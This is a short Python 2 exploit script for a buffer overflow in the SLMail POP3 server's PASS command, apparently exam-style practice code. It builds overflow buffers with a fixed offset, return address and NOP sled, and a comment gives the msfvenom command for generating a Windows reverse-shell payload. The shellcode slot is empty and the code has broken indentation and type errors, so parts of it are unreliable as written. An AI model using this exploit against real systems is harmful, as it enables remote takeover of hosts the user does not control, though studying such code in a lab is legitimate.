#!/usr/bin/python
import socket
import getopt
import sys
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

badchars = ("")#add your shell code here

#shell code generated with msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=443 -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai

shellcode = ()

def main(argv):
   ipaddr = ''
   try:
       opts, args = getopt.getopt(argv,"hi:b",["ip=","buff="])
   except getopt.GetoptError:
       print 'slmail-pop3.py -i <ip> -b <buff>'
       sys.exit(2)
   for opt, arg in opts:
       if opt == '-h':
           print 'slmail-pop3.py -i <ip> -b <buff>'
           sys.exit()
       elif opt in ("-i", "--ip"):
           ipaddr = arg
       elif opt in ("-b", "--buff"):
           buff = arg

    buffer = 'A' * buff
    buffer2 = 'A' * 2606 + 'B' * 4 + 'C' * 90
    buffer3 = 'A' * 2606 + "\x8f\x35\x4a\x5f" + "\x90" *16 + shellcode + 'C' * (3500-2606-4-351-16)

    try:
        print "\nSending evil buffer..."
        s.connect((ipaddr, 110))
        data = s.recv(1024)
        s.send('USER username' +'\r\n')
        data = s.recv(1024)
        s.send('PASS ' + buffer + '\r\n')
        print "\nDone!."
    except:
        print "Could not connect to POP3!"

    s.close()

if __name__ == "__main__":
   main(sys.argv[1:])

